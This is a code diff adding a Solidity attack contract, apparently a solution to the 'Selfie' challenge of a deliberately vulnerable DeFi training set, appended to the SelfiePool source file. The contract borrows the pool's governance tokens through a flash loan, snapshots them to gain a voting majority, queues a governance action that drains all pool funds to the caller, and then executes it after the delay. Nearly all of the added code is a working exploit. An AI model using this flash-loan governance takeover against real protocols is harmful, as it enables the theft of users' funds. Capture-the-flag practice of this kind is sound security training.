@@ -56,3 +56,42 @@ contract SelfiePool is ReentrancyGuard {
         emit FundsDrained(receiver, amount);
     }
 }
+
+import "../DamnValuableTokenSnapshot.sol";
+
+contract AttackSelfiePool {
+    // take flashLoan and create a snapshot of DVT token 
+    // then queue drainFunds as action as we have more than half of supply and return the flashLoan
+    // for _canBeExecuted() to be true pass 2 days, then call executeAction
+
+    DamnValuableTokenSnapshot public governanceToken;
+    SelfiePool public lenderPool;  
+    SimpleGovernance public governance;
+    uint256 private actionId;
+
+    constructor(address _governanceTokenAddress, address _lenderPool, address _governanceAddress) {
+        governanceToken = DamnValuableTokenSnapshot(_governanceTokenAddress);
+        lenderPool = SelfiePool(_lenderPool);
+        governance = SimpleGovernance(_governanceAddress);
+    }
+
+    function exploitQueueAction() public returns(uint256) {
+        lenderPool.flashLoan(governanceToken.balanceOf(address(lenderPool)));
+        // queue Action and save actionId
+        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", msg.sender);
+        actionId = governance.queueAction(address(lenderPool), data, 0);
+        return actionId;
+    }
+
+    function executeAction() public {
+        governance.executeAction(actionId);
+    }
+
+    fallback() external payable {
+        governanceToken.snapshot();
+        governanceToken.transfer(address(lenderPool), governanceToken.balanceOf(address(this)));
+    }
+
+    receive() external payable {}
+
+}
